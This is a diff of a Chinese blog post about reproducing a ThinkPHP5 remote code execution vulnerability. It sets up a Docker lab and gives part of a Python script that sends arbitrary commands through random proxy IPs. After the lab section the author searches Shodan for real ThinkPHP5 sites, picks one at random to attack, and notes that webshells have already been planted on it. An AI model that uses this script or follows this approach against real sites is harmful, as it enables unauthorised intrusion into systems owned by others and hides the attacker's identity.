@@ -23,17 +23,17 @@ tags: 渗透测试
 ## 三、复现
 - 有了payload，剩下的就是搭建复现环境了。这里给大家说一下我的习惯：直接用docker pull，有的表哥可能喜欢自己搭一遍，这样能够学到更多的东西，但是我为了图方便，一般都是直接用docker实现了
 - 安装docker应该大家都会，如果有人不是很了解docker的话，我这里讲一个非常简单的方法：在centos7里先yum -y updat确保自己的最新的，然后重启，执行yum -y install docker*，这样很简单的就把docker装上了
-然后：
+- 然后：
 ```
 docker pull docker.io/clarencep/tp5-dev
 docker run -d --name thinkphp5 -p 8000:8000 docker.io/clarencep/tp5-dev
 ```
-然后就可以访问http://ip:8000来看一下是否成功  
+- 然后就可以访问http://ip:8000来看一下是否成功  
 ![测试环境](https://images-cdn.shimo.im/anrkeZR5YHosWG5t__thumbnail)  
-确认成功跑起来之后选一个payload来访问就可以了  
+- 确认成功跑起来之后选一个payload来访问就可以了  
 ![测试payload](https://images-cdn.shimo.im/WD0eNDELsyscHQN2__thumbnail)  
 ## 四、愉快玩耍
-有了payload，就可以写一个简单的脚本来玩了
+- 有了payload，就可以写一个简单的脚本来玩了
 ```
 #coding=utf-8
 import requests,sys,random
@@ -54,7 +54,6 @@ def poc(site,command):
     req=requests.get(url,headers=headers,proxies=proxies)
     print(req.text)
     print('-----------------------------------------')
-
 try:
     site=sys.argv[1]
     command=sys.argv[2]
@@ -66,9 +65,9 @@ except:
         poc(site,command)
 poc(site,command)
 ```
-我在脚本里写了几个随便在网上找的代理IP，大家也可以写自己的  
-去shodan上看一眼：
+- 我在脚本里写了几个随便在网上找的代理IP，大家也可以写自己的  
+- 去shodan上看一眼：
 ![shodan](https://images-cdn.shimo.im/rHUy523VPVYwhuOt__thumbnail)  
-哇，好多thinkphp5的网站，随便挑一个    
+- 哇，好多thinkphp5的网站，随便挑一个    
 ![上手](https://images-cdn.shimo.im/nncjpXyHhSYvKVTY__thumbnail)  
-我早上看的时候还好好地，现在已经被人传进去这么多马了，还有asp的，真的娘的是个人才
+- 我早上看的时候还好好地，现在已经被人传进去这么多马了，还有asp的，真的娘的是个人才
